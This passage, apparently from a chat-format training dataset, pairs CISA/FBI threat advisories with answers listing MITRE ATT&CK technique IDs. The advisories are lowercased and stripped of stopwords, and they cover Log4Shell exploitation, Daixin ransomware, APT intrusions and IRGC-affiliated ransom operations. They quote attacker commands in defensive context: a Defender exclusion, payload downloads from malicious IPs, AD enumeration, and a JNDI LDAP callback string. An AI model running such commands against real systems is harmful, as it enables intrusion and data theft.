exploitation log4shell vulnerability cve202144228in vmware horizon servers coordination fceb organization cisa initiated threat hunting incident response activities however prior deploying incident response team cisa observed additional suspected apt activity specifically cisa observed https activity ip address 518918164 organizations vmware server based trusted thirdparty reporting 518918164 lightweight directory access protocol ldap server associated threat actors exploiting log4shell following https activity cisa observed suspected ldap callback port 443 ip address cisa also observed dns query usnationnycf resolved back 518918164 victim server returning log4shell ldap callback actors server cisa assessed traffic indicated confirmed compromise based successful callback indicator informed organization findings organization investigated activity found signs compromise trustedthird party reporting associated log4shell activity 518918164 lateral movement targeting dcs cisa suspected threat actors moved laterally compromised organizations dc midjune midjuly 2022 cisa conducted onsite incident response engagement determined organization compromised early february 2022 likely iranian governmentsponsored apt actors installed xmrig crypto mining software threat actors also moved laterally domain controller compromised credentials implanted ngrok reverse proxies threat actor activity february 2022 threat actors exploited log4shell initial access organizations unpatched vmware horizon server part initial exploitation cisa observed connection known malicious ip address 182542172 lasting 176 seconds actors exploit payload ran following powershell command added exclusion rule windows defender powershell tryaddmppreference exclusionpath c writehost addedexclusion catch writehost addingexclusionfailed powershell enc base64 encoded payload download next stage execute exclusion rule allowlisted entire cdrive enabling threat actors download tools cdrive without virus scans exploit payload downloaded mdeploytext 182542172mdepoytxt cuserspublicmdeps1 executed mdeps1 downloaded filezip 182542172 removed mdeps1 disk filezip contained xmrig cryptocurrency mining software associated configuration files winring0x64sys xmrig miner driver wuacltserviceexe xmrig miner configjson xmrig miner configuration runtimebrokerexe associated file file create local user account tests internet connectivity pinging 8888 exploit payload created scheduled task executed runtimebrokerexe daily system note exploiting log4shell actors gained access vmware service account administrator system level access scheduled task named runtimebrokerserviceexe masquerade legitimate windows task see mar 103870611v1 additional information including iocs four files obtaining initial access installing xmrig vmware horizon server actors used rdp builtin windows user account defaultaccount move laterally vmware vdikms host threat actor established vdikms host cisa observed actors download around 30 megabytes files transfersh server associated 14476136153 actors downloaded following tools psexec microsoft signed tool system administrators mimikatz credential theft tool ngrok reverse proxy tool proxying internal service onto ngrok domain user access randomly generated subdomain ngrokio cisa observed tool use commercial products benign purposes however process bypasses typical firewall controls may potentially unwanted application production environments ngrok known used malicious purposes1 threat actors executed mimikatz vdikms harvest credentials created rogue domain administrator account using newly created account actors leveraged rdp propagate several hosts within network upon logging host actors manually disabled windows defender via graphical user interface gui implanted ngrok executables configuration files threat actors able implant ngrok multiple hosts ensure ngroks persistence lose access machine routine reboot actors able proxy rdp sessions observable local network outgoing https port 443 connections tunnelusngrokcom korgnsulennutcom prior domain reverse possible observed threat actors configured custom domain used ngrok tunnel domains wildcarded ngrokcom ngrokio ngroktunnelcom korgnlennutcom threat actors established deep foothold network moved laterally domain controller executed following powershell command active directory obtain list machines attached domain powershellexe getadcomputer filter properties select nameoperatingsystemipv4address gt threat actors also changed password local administrator account several hosts backup rogue domain administrator account get detected terminated additionally threat actor observed attempting dump local security authority subsystem service lsass process task manager stopped additional antivirus fceb organization installed mitre attck tactics techniques see table 1 referenced threat actor tactics techniques advisory well corresponding detection andor mitigation recommendations additional mitigations see mitigations section incident response suspected initial access compromise detected based iocs ttps csa cisa encourages organizations assume lateral movement threat actors investigate connected systems dc cisa recommends organizations apply following steps applying mitigations including patching immediately isolate affected systems collect review relevant logs data artifacts take memory capture devices forensic image capture detailed analysis consider soliciting support thirdparty incident response organization provide subject matter expertise ensure actor eradicated network avoid residual issues could enable followon exploitation report incidents cisa via cisas 247 operations center saycisacisadhsgov 8882820870 local fbi field office fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov mitigations cisa fbi recommend implementing mitigations table 1 improve organizations cybersecurity posture basis threat actor behaviors install updated builds ensure affected vmware horizon uag systems updated latest version updates workarounds promptly applied following vmwares release updates log4shell december 2021 treat vmware horizon systems compromised follow proactive incident response procedures outlined prior applying updates compromise detected apply updates soon possible see vmware security advisory vmsa2021002813 vmware knowledge base kb 87073 determine vmware horizon components vulnerable note update fully implemented consider removing vulnerable components internet limit scope traffic installing updates ensure network perimeter access controls restrictive possible upgrading immediately feasible see kb87073 kb87092 vendorprovided temporary workarounds implement temporary solutions using account administrative privileges note temporary solutions treated permanent fixes vulnerable components upgraded latest build soon possible prior implementing temporary solution ensure appropriate backups completed verify successful implementation mitigations executing vendor supplied script horizonwindowslog4jmitigationszip without parameters ensure vulnerabilities remain see kb87073 details keep software date prioritize patching known exploited vulnerabilities kevs minimize internetfacing attack surface hosting essential services segregated dmz ensuring strict network perimeter access controls hosting internetfacing services essential business operations possible implement regularly updated web application firewalls waf front publicfacing services wafs protect webbased exploitation using signatures heuristics likely block alert malicious traffic use best practices identity access management iam implementing phishing resistant multifactor authentication mfa enforcing use strong passwords regularly auditing administrator accounts permissions limiting user access principle least privilege disable inactive accounts uniformly across ad mfa systems etc using windows 10 version 1607 windows server 2016 later monitor disable windows defaultaccount also known default system managed account dsma audit domain controllers log successful kerberos ticket granting service tgs requests ensure events monitored anomalous activity secure accounts enforce principle least privilege administrator accounts minimum permission necessary complete tasks ensure unique distinct administrative accounts set administrative tasks create nonprivileged accounts privileged users ensure use nonprivileged accounts nonprivileged access eg web browsing email access create deny list known compromised credentials prevent users using knowncompromised passwords secure credentials restricting accounts credentials used using local device credential protection features use virtualizing solutions modern hardware software ensure credentials securely stored ensure storage clear text passwords lsass memory disabled note windows 8 enabled default information see microsoft security advisory update improve credentials protection management consider disabling limiting ntlm wdigest authentication implement credential guard windows 10 server 2016 refer microsoft manage windows defender credential guard information windows server 2012r2 enable protected process light local security authority lsa minimize ad attack surface reduce malicious ticketgranting activity malicious activity kerberoasting takes advantage kerberos tgs used obtain hashed credentials threat actors attempt crack validate security controls addition applying mitigations cisa fbi recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa fbi recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 1 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa fbi recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory references1 mitre attck version 11 software ngrok revisions initial version november 16 2022 product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1016.001, T1018, T1021.001, T1053.005, T1059.001, T1070.004, T1078.001, T1090, T1098, T1105, T1136.001, T1136.002, T1190, T1555, T1562.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today mitigate cyber threats ransomware install updates operating systems software firmware soon released require phishingresistant mfa many services possible train users recognize report phishing attempts note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa department health human services hhs releasing joint csa provide information daixin team cybercrime group actively targeting us businesses predominantly healthcare public health hph sector ransomware data extortion operations joint csa provides ttps iocs daixin actors obtained fbi threat response activities thirdparty reporting download pdf version report stopransomware daixin team pdf 56058 kb download iocs aa22294a stix xml 2322 kb technical details note advisory uses mitre attck enterprise framework version 11 see mitre attck enterprise referenced tactics techniques cybercrime actors routinely target hph sector organizations ransomware october 2022 per fbi internet crime complaint center ic3 data specifically victim reports across 16 critical infrastructure sectors hph sector accounts 25 percent ransomware complaints according ic3 annual report 2021 649 ransomware reports made across 14 critical infrastructure sectors hph sector accounted reports 148 daixin team ransomware data extortion group targeted hph sector ransomware data extortion operations since least june 2022 since daixin team cybercrime actors caused ransomware incidents multiple hph sector organizations deployed ransomware encrypt servers responsible healthcare servicesincluding electronic health records services diagnostics services imaging services intranet services andor exfiltrated personal identifiable information pii patient health information phi threatened release information ransom paid daixin actors gain initial access victims virtual private network vpn servers one confirmed compromise actors likely exploited unpatched vulnerability organizations vpn server another confirmed compromise actors used previously compromised credentials access legacy vpn server multifactor authentication mfa enabled actors believed acquired vpn credentials use phishing email malicious attachment obtaining access victims vpn server daixin actors move laterally via secure shell ssh remote desktop protocol rdp daixin actors sought gain privileged account access credential dumping pass hash actors leveraged privileged accounts gain access vmware vcenter server reset account passwords esxi servers environment actors used ssh connect accessible esxi servers deploy ransomware servers according thirdparty reporting daixin teams ransomware based leaked babuk locker source code thirdparty reporting well fbi analysis show ransomware targets esxi servers encrypts files located vmfsvolumes following extensions vmdkvmemvswpvmsdvmx vmsn ransom note also written vmfsvolumes see figure 1 targeted file system path figure 2 targeted file extensions list figure 3 figure 4 include examples ransom notes note figure 3 ransom note daixin actors misspell daixin daxin figure 1 daixin team ransomware targeted file path figure 2 daixin team ransomware targeted file extensions figure 3 example 1 daixin team ransomware note figure 4 example 2 daixin team ransomware note addition deploying ransomware daixin actors exfiltrated data victim systems one confirmed compromise actors used rclonean opensource program manage files cloud storageto exfiltrate data dedicated virtual private server vps another compromise actors used ngroka reverse proxy tool proxying internal service onto ngrok domainfor data exfiltration mitre attck tactics techniques see table 1 referenced threat actor tactics techniques included advisory table 1 daixin actors attck techniques enterprise indicators compromise see table 2 iocs obtained thirdparty reporting table 2 daixin team iocs rclone associated sha256 hashes mitigations fbi cisa hhs urge hph sector organizations implement following protect daixin related malicious activity install updates operating systems software firmware soon released prioritize patching vpn servers remote access software virtual machine software known exploited vulnerabilities consider leveraging centralized patch management system automate expedite process require phishingresistant mfa many services possibleparticularly webmail vpns accounts access critical systems privileged accounts manage backups use remote desktop protocol rdp secure monitor limit access resources internal networks especially restricting rdp using virtual desktop infrastructure assessing risks rdp deemed operationally necessary restrict originating sources require multifactor authentication mfa mitigate credential theft reuse rdp must available externally use virtual private network vpn virtual desktop infrastructure means authenticate secure connection allowing rdp connect internal devices monitor remote accessrdp logs enforce account lockouts specified number attempts block brute force campaigns log rdp login attempts disable unused remote accessrdp ports ensure devices properly configured security features enabled disable ports protocols used business purposes eg rdp transmission control protocol port 3389 turn ssh network device management interfaces telnet winbox http wide area networks wans secure strong passwords encryption enabled implement enforce multilayer network segmentation critical communications data resting secure reliable layer limit access data deploying public key infrastructure digital certificates authenticate connections network internet things iot medical devices electronic health record system well ensure data packages manipulated transit maninthemiddle attacks use standard user accounts internal systems instead ofadministrativeaccounts allow overarching administrative system privileges ensure least privilege secure piiphi collection points encrypt data rest transit using technologies transport layer security tps store personal patient data internal systems protected firewalls ensure extensive backups available data ever compromised protect stored data masking permanent account number pan displayed rendering unreadable storedthrough cryptography example secure collection storage processing practices pii phi per regulations health insurance portability accountability act 1996 hipaa implementing hipaa security measures prevent introduction malware system use monitoring tools observe whether iot devices behaving erratically due compromise create regularly review internal policies regulate collection storage access monitoring piiphi addition fbi cisa hhs urge organizations including hph sector organizations apply following recommendations prepare mitigateprevent respond ransomware incidents preparing ransomware maintain offline ie physically disconnected backups data regularly test backup restoration practices safeguard organizations continuity operations least minimize potential downtime ransomware incident protect data losses ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure create maintain exercise basic cyber incident response plan associated communications plan includes response procedures ransomware incident organizations also ensure incident response communications plans include response notification procedures data breach incidents ensure notification procedures adhere applicable state laws refer applicable state data breach laws consult legal counsel necessary breaches involving electronic health information may need notify federal trade commission ftc department health human services andin casesthe media refer ftcs health breach notification rule us department health human services breach notification rule information see cisamultistate information sharing analysis center msisac joint ransomware guide cisa fact sheet protecting sensitive personal information ransomwarecaused data breaches information creating ransomware response checklist planning responding ransomwarecaused data breaches mitigating preventing ransomware restrict server message block smb protocol within network access servers necessary remove disable outdated versions smb ie smb version 1 threat actors use smb propagate malware across organizations review security posture thirdparty vendors interconnected organization ensure connections thirdparty vendors outside software hardware monitored reviewed suspicious activity implement listing policies applications remote access allow systems execute known permitted programs open document readers protected viewing modes help prevent active content running implement user training program phishing exercises raise awareness among users risks visiting suspicious websites clicking suspicious links opening suspicious attachments reinforce appropriate user response phishing spearphishing emails use strong passwords avoid reusing passwords multiple accounts see cisa tip choosing protecting passwords national institute standards technologys nists special publication 80063b digital identity guidelines information require administrator credentials install software audit user accounts administrative elevated privileges configure access controls least privilege mind install regularly update antivirus antimalware software hosts use secure networks avoid using public wifi networks consider installing using vpn consider adding email banner messages coming outside organizations disable hyperlinks received emails responding ransomware incidents ransomware incident occurs organization follow organizations ransomware response checklist see preparing ransomware section scan backups possible scan backup data antivirus program check free malware performed using isolated trusted system avoid exposing backups potential compromise follow notification requirements outlined cyber incident response plan report incidents fbi local fbi field office cisa cisagovreport us secret service usss usss field office apply incident response best practices found joint cybersecurity advisory technical approaches uncovering remediating malicious activity developed cisa cybersecurity authorities australia canada new zealand united kingdom note fbi cisa hhs strongly discourage paying ransoms guarantee files records recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities references stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment ongoing threat alerts sector alerts produced health sector cybersecurity coordination center hc3 found hhsgovhc3 additional best practices healthcare cybersecurity issues see hhs 405d aligning health care industry security approaches 405dhhsgov reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications daixin group actors bitcoin wallet information decryptor files andor benign sample encrypted file regardless whether organization decided pay ransom fbi cisa hhs urge promptly report ransomware incidents local fbi field office cisa cisagovreport acknowledgements fbi cisa hhs would like thank crowdstrike health information sharing analysis center healthisac contributions csa disclaimer information report provided informational purposes fbi cisa hhs endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa hhs revisions initial publication october 21 2022 product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1078, T1098, T1190, T1486, T1550.002, T1563.002, T1567"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions help protect apt cyber activity enforce multifactor authentication mfa user accounts implement network segmentation separate network segments based role functionality update software including operating systems applications firmware network assets audit account usage november 2021 january 2022 cybersecurity infrastructure security agency cisa responded advanced persistent threat apt activity defense industrial base dib sector organizations enterprise network incident response activities cisa uncovered likely multiple apt groups compromised organizations network apt actors longterm access environment apt actors used opensource toolkit called impacket gain foothold within environment compromise network also used custom data exfiltration tool covalentstealer steal victims sensitive data joint cybersecurity advisory csa provides apt actors tactics techniques procedures ttps indicators compromise iocs identified incident response activities cisa thirdparty incident response organization csa includes detection mitigation actions help organizations detect prevent related apt activity cisa federal bureau investigation fbi national security agency nsa recommend dib sector critical infrastructure organizations implement mitigations csa ensure managing reducing impact cyber threats networks download pdf version report pdf 692 kb downloadable copy iocs see following files malware analysis report mar103652271stix 966 kb mar103652272stix 249b mar103652273stix 32 mb technical details threat actor activity note advisory uses mitre attck enterprise framework version 11 see mitre attck tactics techniques section table apt cyber activity mapped mitre attck enterprise framework november 2021 january 2022 cisa conducted incident response engagement dib sector organizations enterprise network victim organization also engaged thirdparty incident response organization assistance incident response activities cisa trusted thirdparty identified apt activity victims network apt actors gained initial access organizations microsoft exchange server early midjanuary 2021 initial access vector unknown based log analysis actors gathered information exchange environment performed mailbox searches within fourhour period gaining access period actors used compromised administrator account admin 1 access ews application programming interface api early february 2021 actors returned network used admin 1 access ews api instances actors used virtual private network vpn four days later apt actors used windows command shell threeday period interact victims network actors used command shell learn organizations environment collect sensitive data including sensitive contractrelated information shared drives eventual exfiltration actors manually collected files using commandline tool winrar files split approximately 3mb chunks located microsoft exchange server within cu2hedebug directory see appendix windows command shell activity additional information including specific commands used period apt actors implanted impacket python toolkit programmatically constructing manipulating network protocols another system actors used impacket attempt move laterally another system early march 2021 apt actors exploited cve202126855 cve202126857 cve202126858 cve202127065 install 17 china chopper webshells exchange server later march apt actors installed hyperbro exchange server two systems information hyperbro webshell samples see cisa mar103652272 3 april 2021 apt actors used impacket network exploitation activities see use impacket section additional information late july midoctober 2021 apt actors employed custom exfiltration tool covalentstealer exfiltrate remaining sensitive files see use custom exfiltration tool covalentstealer section additional information apt actors maintained access midjanuary 2022 likely relying legitimate credentials use impacket cisa discovered activity indicating use two impacket tools wmiexecpy smbexecpy tools use windows management instrumentation wmi server message block smb protocol respectively creating semiinteractive shell target device command shell impacket user credentials run commands remote device using windows management protocols required support enterprise network apt cyber actors used existing compromised credentials impacket access higher privileged service account used organizations multifunctional devices threat actors first used service account remotely access organizations microsoft exchange server via outlook web access owa multiple external ip addresses shortly afterwards actors assigned application impersonation role service account running following powershell command managing exchange powershell addpssnapin exchangenewmanagementroleassignment namejournalinglogs roleapplicationimpersonation useraccount command gave service account ability access users mailboxes apt cyber actors used virtual private network vpn virtual private server vps providers m247 surfshark part techniques remotely access microsoft exchange server use hosting providers serves conceal interaction victim networks common threat actors according cisas analysis victims microsoft exchange server internet information services iis logs actors used account former employee access ews ews enables access mailbox items email messages meetings contacts source ip address connections mostly vps hosting provider m247 use custom exfiltration tool covalentstealer threat actors employed custom exfiltration tool covalentstealer exfiltrate sensitive files covalentstealer designed identify file shares system categorize files upload files remote server covalentstealer includes two configurations specifically target victims documents using predetermined files paths user credentials covalentstealer stores collected files microsoft onedrive cloud folder includes configuration file specify types files collect specified times uses 256bit aes key encryption see cisa mar103652271 additional technical details including iocs detection signatures mitre attck tactics techniques mitre attck globally accessible knowledge base adversary tactics techniques based realworld observations cisa uses attck framework foundation development specific threat models methodologies table 1 lists attck techniques employed apt actors detection given actors demonstrated capability maintain persistent longterm access compromised enterprise environments cisa fbi nsa encourage organizations monitor logs connections unusual vpss vpns examine connection logs access unexpected ranges particularly machines hosted surfshark m247 monitor suspicious account use eg inappropriate unauthorized use administrator accounts service accounts thirdparty accounts detect use compromised credentials combination vps follow steps review logs impossible logins logins changing username user agent strings ip address combinations logins ip addresses align expected users geographic location search impossible travel occurs user logs multiple ip addresses significant geographic distance apart ie person could realistically travel geographic locations two ip addresses time logins note detection opportunity result false positives legitimate users apply vpn solutions connecting networks search one ip used across multiple accounts excluding expected logins take note m247associated ip addresses used along vpn providers eg surfshark look successful remote logins eg vpn owa ips coming m247 using surfsharkregistered ip addresses identify suspicious privileged account use resetting passwords applying user account mitigations search unusual activity typically dormant accounts search unusual user agent strings strings typically associated normal user activity may indicate bot activity review yara rules provided mar103652271 assist determining whether malicious activity observed monitor installation unauthorized software including remote server administration tools eg psexec rdclient vnc screenconnect monitor anomalousand known malicious commandline use see appendix windows command shell activity commands used actors interact victims environment monitor unauthorized changes user accounts eg creation permission changes enabling previously disabled account containment remediation organizations affected active recently active threat actors environment take following initial steps aid eviction efforts prevent reentry report incident report incident us government authorities follow organizations incident response plan report incidents cisa via cisas 247 operations center saycisacisadhsgov 8882820870 report incidents local fbi field office fbigovcontactusfieldoffices fbis 247 cyber watch cywatch via 855 2923937 cywatchfbigov dib incident reporting contact defense cyber crime center dc3 via dibnet dibnetdodmilportalintranet 410 981 0104 reset login accountsreset accounts used authentication since possible threat actors additional stolen credentials password resets also include accounts outside microsoft active directory network infrastructure devices nondomain joined devices eg iot devices monitor siem logs build detectionscreate signatures based threat actor ttps use signatures monitor security logs signs threat actor reentry enforce mfa user accounts enforce phishingresistant mfa accounts without exception greatest extent possible follow microsofts security guidance active directorybest practices securing active directory audit accounts permissions audit accounts ensure unused accounts disabled removed active accounts excessive privileges monitor siem logs changes accounts permission changes enabling previously disabled account might indicate threat actor using accounts harden monitor powershell reviewing guidance joint cybersecurity information sheetkeeping powershell security measures use embrace mitigations mitigation recommendations usually longerterm efforts take place compromise part risk management efforts threat actors evicted environment immediate response actions complete may tailored ttps used threat actor recovery recommendations largely general best practices industry standards aimed bolstering overall cybersecurity posture segment networks based function implement network segmentation separate network segments based role functionality proper network segmentation significantly reduces ability ransomware threat actor lateral movement controlling traffic flows betweenand access tovarious subnetworks see cisas infographic layering network security segmentation nsas segment networks deploy applicationaware defenses isolate similar systems implement microsegmentation granular access policy restrictions modernize cybersecurity adopt zero trust zt principles network perimeter internal devices logical physical segmentation critical limiting preventing lateral movement privilege escalation exfiltration manage vulnerabilities configurations update software including operating systems applications firmware network assets prioritize patching known exploited vulnerabilities critical high vulnerabilities allow remote code execution denialofservice internetfacing equipment implement configuration change control process securely creates device configuration backups detect unauthorized modifications configuration change needed document change include authorization purpose mission justification periodically verify modifications applied comparing current device configurations recent backups suspicious changes observed verify change authorized search anomalous behavior use cybersecurity visibility analytics tools improve detection anomalous behavior enable dynamic changes policy response actions visibility tools include network monitoring tools hostbased logs monitoring tools endpoint detection response edr tool edr tools particularly useful detecting lateral connections insight common uncommon network connections host monitor use scripting languages eg python powershell authorized unauthorized users anomalous use either group may indicative malicious activity intentional otherwise restrict secure use remote admin tools limit number remote access tools well accessed using reducing number remote admin tools allowed access increase visibility unauthorized use tools use encrypted services protect network communications disable clear text administration serviceseg telnet http ftp snmp 12c ensures sensitive information easily obtained threat actor capturing network traffic implement mandatory access control model implement stringent access controls sensitive data resources access restricted users require access minimal level access needed audit account usage monitor vpn logins look suspicious access eg logins unusual geo locations remote logins accounts normally used remote access concurrent logins account different locations unusual times day closely monitor use administrative accounts admin accounts used sparingly necessary installing new software patches use admin accounts reviewed determine activity legitimate ensure standard user accounts elevated privileges attempt increase permissions standard user accounts investigated potential compromise validate security controls addition applying mitigations cisa fbi nsa recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa fbi nsa recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 1 align security technologies technique test technologies technique analyze performance detection prevention technologies repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa fbi nsa recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources cisa offers several nocost scanning testing services help organizations reduce exposure threats taking proactive approach mitigating attack vectors see cisagovcyberhygieneservices us dib sector organizations may consider signing nsa cybersecurity collaboration centers dib cybersecurity service offerings including protective domain name system pdns services vulnerability scanning threat intelligence collaboration eligible organizations information enroll services email dibdefensecybernsagov acknowledgements cisa fbi nsa acknowledge mandiant contributions csa appendix windows command shell activity threeday period february 2021 apt cyber actors used windows command shell interact victims environment interacting victims system executing commands threat actors used q c parameters turn echo carry command specified string stop execution completed first day threat actors consecutively executed many commands within windows command shell learn organizations environment collect sensitive data eventual exfiltration see table 2 second day apt cyber actors executed commands table 3 perform discovery well collect archive data third day apt cyber actors returned organizations network executed commands table 4 references1 microsoft net share2 microsoft getchilditem3 microsoft systeminfo4 microsoft tasklist5 microsoft ipconfig6 microsoft route7 microsoft netstat8 microsoft certutil9 microsoft ping10 microsoft taskkill11 microsoft compressarchive12 ntfsinfo v1213 rarlab14 microsoft importmodule15 microsoft set environment variable16 microsoft tasklist17 mitre attck sofware tasklist18 microsoft find19 microsoft ping20 microsoft del revisions october 4 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1016, T1016.001, T1021.002, T1033, T1036.005, T1039, T1047, T1049, T1057, T1059, T1059.001, T1059.003, T1059.006, T1070, T1070.004, T1078, T1082, T1083, T1090, T1095, T1105, T1129, T1543, T1560.001, T1562.001, T1567.002, T1569, T1574"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today protect ransom operations keep systems software updated prioritize remediating known exploited vulnerabilities enforce mfa make offline backups data joint cybersecurity advisory csa result analytic effort among federal bureau investigation fbi cybersecurity infrastructure security agency cisa national security agency nsa us cyber command uscc cyber national mission force cnmf department treasury treasury australian cyber security centre acsc canadian centre cyber security cccs united kingdoms national cyber security centre ncsc highlight continued malicious cyber activity advanced persistent threat apt actors authoring agencies assess affiliated iranian governments islamic revolutionary guard corps irgc note irgc iranian government agency tasked defending iranian regime perceived internal external threats hereafter advisory refers coauthors advisory authoring agencies advisory updates joint csa iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities furtherance malicious activities provides information iranian governmentsponsored apt actors exploiting known fortinet microsoft exchange vulnerabilities gain initial access broad range targeted entities furtherance malicious activities including ransom operations authoring agencies judge actors apt group affiliated irgc since initial reporting activity fbi liaison alert system flash report apt actors exploiting fortinet vulnerabilities gain access malicious activity may 2021 authoring agencies continued observe irgcaffiliated actors exploiting known vulnerabilities initial access addition exploiting fortinet microsoft exchange vulnerabilities authoring agencies observed apt actors exploiting vmware horizon log4j vulnerabilities initial access irgcaffiliated actors used access followon activity including disk encryption data extortion support ransom operations irgcaffiliated actors actively targeting broad range entities including entities across multiple us critical infrastructure sectors well australian canadian united kingdom organizations actors often operate auspices najee technology hooshmand fater llc based karaj iran afkar system yazd company based yazd iran authoring agencies assess actors exploiting known vulnerabilities unprotected networks rather targeting specific targeted entities sectors advisory provides observed tactics techniques indicators compromise iocs authoring agencies assess likely associated irgcaffiliated apt authoring agencies urge organizations especially critical infrastructure organizations apply recommendations listed mitigations section advisory mitigate risk compromise irgcaffiliated cyber actors downloadable copy iocs see aa22257astix information iranian statesponsored malicious cyber activity see cisas iran cyber threat overview advisories webpage fbis iran threat webpage download pdf version report pdf 836 kb technical details threat actor activity reported joint csa iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities furtherance malicious activities authoring agencies observed iranian governmentsponsored apt actors scanning andor exploiting following known fortinet fortios microsoft exchange server vulnerabilities since early 2021 gain initial access broad range targeted entities cve201813379 cve202012812 cve20195591 cve202134473 proxyshell vulnerability authoring agencies also observed apt actors leveraging cve202134473 us networks combination proxyshell vulnerabilities cve202134523 cve202131207 ncsc judges yazd iranbased company afkar system yazd company actively targeting uk organizations additionally acsc judges apt actors used cve202134473 australia gain access systems apt actors leverage access malicious activities including deployment tools support ransom extortion operations data exfiltration since activity reported 2021 irgcaffiliated actors continued exploit known vulnerabilities initial access addition exploiting fortinet microsoft exchange vulnerabilities authoring agencies observed apt actors exploiting vmware horizon log4j vulnerabilities cve202144228 log4shell cve202145046 cve202145105 initial access irgcaffiliated actors used access ransom operations including disk encryption extortion efforts gaining access network irgcaffiliated actors likely determine course action based perceived value data depending perceived value actors may encrypt data ransom andor exfiltrate data actors may sell data use exfiltrated data extortion operations double extortion ransom operations threat actor uses combination encryption data theft pressure targeted entities pay ransom demands irgcaffiliated actor activity observed authoring agencies includes december 2021 actors exploited proxyshell vulnerabilities likely cve202134473 cve202134523 cve202131207 microsoft exchange server gain access network us police department actors used access move laterally within network encrypt network devices bitlocker hold decryption keys ransom december 2021 actors exploited proxyshell vulnerabilities likely cve202134473 cve202134523 cve202131207 microsoft exchange server gain access network us regional transportation company actors used access move laterally within network encrypt network devices bitlocker hold decryption keys ransom activity disrupted transportation companys operations extended period february 2022 actors exploited log4j vulnerability likely cve202144228 cve202145046 andor cve202145105 vmware horizon application gain access network us municipal government move laterally within network establish persistent access initiate cryptomining operations conduct additional malicious activity february 2022 actors may exploited log4j vulnerability likely cve202144228 cve202145046 andor cve2021 gain access network us aerospace company actors leveraged server authoring agencies assess associated irgcaffiliated actors exfiltrate data companys network mitre attck tactics techniques note advisory uses mitre attck enterprise framework version 11 see appendix b table mitre attck tactics techniques observed authoring agencies assess following tactics techniques associated activity resource development irgcaffiliated actors used following malicious legitimate tools variety tactics across enterprise spectrum fast reverse proxy frp command control c2 plink c2 remote desktop protocol rdp lateral movement bitlocker data encryption softperfect network scanner system network configuration discovery note additional tools used irgcaffiliated cyber actors see joint csa iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities furtherance malicious activities initial access stated technical details section previously reported joint csa iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities furtherance malicious activities irgcaffiliated actors gained initial access exploiting known vulnerabilities following iocs observed march 2022 indicative proxyshell vulnerability exploitation targeted entity networks web shells naming conventions aspx11 randomly generated alphabetic charactersaspx loginaspx defaultaspx following directories cprogram filesmicrosoftexchange serverv15frontendhttpproxyecpauth cprogram filesmicrosoftexchange serverv15frontendhttpproxyowaauth cinetpubwwwrootaspnetclient following iocs observed december 2021 indicative log4j vulnerability exploitation targeted entity networks jndildap148251711821389rce user agent string rceclass execution irgcaffiliated actors may made modifications task scheduler modifications may display unrecognized scheduled tasks actions specifically established tasks may associated activity wininet wininet winlogon cachetask note potential exists tasks associated cachetask wininet may legitimate additional tasks used irgcaffiliated cyber actors see joint csa iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities furtherance malicious activities persistence irgcaffiliated actors established new user accounts domain controllers servers workstations active directories actors enabled builtin windows account defaultaccount escalated privileges gain administratorlevel access network accounts appear created look similar existing accounts network specific account names may vary per organization addition unrecognized user accounts accounts established masquerade existing accounts following account usernames may associated activity domain admin itadmin defaultaccount default01 note additional account usernames associated activity see joint csa iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities furtherance malicious activities exfiltration authoring agencies observed irgcaffiliated actors dumping subsequently exfiltrating local security authority subsystem service lsass process memory targeted entity networks furtherance credential harvesting following iocs associated data exfiltration targeted entity networks cwindowstempsasslpmd cwindowstempssaslzip cusersdefaultaccountappdatalocaltemplsassdmp cusersdefaultaccountappdatalocaltemplsasszip impact irgcaffiliated actors forced bitlocker activation host networks encrypt data held decryption keys ransom corresponding ransom notes sent targeted entity left targeted entity network txt file printed targeted entitys networked printers notes included following contact information buysafety telegram werbits telegram 93794415076 whatsapp werbitsonionmailorg buysafetyonionmailorg yacashcashramblerru note additional contact information included ransom notes see joint csa iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities furtherance malicious activities detection authoring agencies recommend 